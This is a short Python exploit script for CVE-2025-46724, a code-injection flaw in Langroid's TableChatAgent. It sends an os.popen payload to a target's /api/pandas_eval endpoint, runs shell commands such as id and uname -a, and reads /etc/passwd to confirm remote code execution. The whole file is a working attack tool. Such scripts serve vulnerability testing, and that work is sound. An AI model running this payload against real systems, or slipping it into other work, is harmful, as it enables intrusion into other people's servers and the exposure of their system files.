#!/usr/bin/env python3
import requests
import sys

def exploit(target_url, command):
    """Exploit CVE-2025-46724 - Langroid TableChatAgent Code Injection"""
    payload = f"__import__('os').popen('{command}').read()"
    
    api_url = f"{target_url.rstrip('/')}/api/pandas_eval"
    
    try:
        response = requests.post(
            api_url,
            json={"expression": payload},
            timeout=10
        )
        
        if response.status_code == 200:
            result = response.json().get("result", "")
            return True, result
        else:
            return False, f"HTTP {response.status_code}"
    except Exception as e:
        return False, str(e)

def main():
    target = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:5000"
    
    print(f"[*] Target: {target}")
    print("[*] CVE-2025-46724 - Langroid TableChatAgent Code Injection")
    print()
    
    test_commands = [
        ("id", "User identity"),
        ("uname -a", "System information"),
        ("cat /etc/passwd | head -3", "Read sensitive file"),
    ]
    
    vulnerable = False
    
    for cmd, desc in test_commands:
        print(f"[*] Testing: {desc}")
        print(f"    Command: {cmd}")
        
        success, result = exploit(target, cmd)
        
        if success and "ERROR" not in result:
            vulnerable = True
            print(f"    Result: {result.strip()}")
            print("[+] Command executed successfully!")
        else:
            print(f"    Failed: {result}")
        print()
    
    if vulnerable:
        print("[+] Target is VULNERABLE to CVE-2025-46724")
        print("[+] Arbitrary code execution via pandas eval() is possible")
        return 0
    else:
        print("[-] Target does not appear to be vulnerable")
        return 1

if __name__ == "__main__":
    sys.exit(main())
